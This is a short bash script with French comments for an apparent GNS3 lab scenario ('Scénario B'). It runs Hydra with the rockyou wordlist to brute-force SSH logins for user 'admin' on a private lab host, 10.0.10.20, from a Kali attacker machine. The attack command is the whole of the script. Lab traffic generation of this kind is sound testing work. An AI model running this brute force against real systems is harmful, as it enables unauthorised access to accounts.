#!/bin/bash
# Scénario B — Brute force SSH (Hydra)
# Itération : 2
# Cible : ssh-eurostar 10.0.10.20
# Exécuter depuis la machine kali-attacker dans GNS3

TARGET="10.0.10.20"
PORT=22
WORDLIST="/usr/share/wordlists/rockyou.txt"
USER="admin"

echo "[*] Scénario B — Brute force SSH Hydra"
echo "[*] Cible : $TARGET:$PORT"
echo "[*] Début : $(date)"

hydra -l $USER -P $WORDLIST -t 4 ssh://$TARGET:$PORT -V

echo "[*] Fin : $(date)"
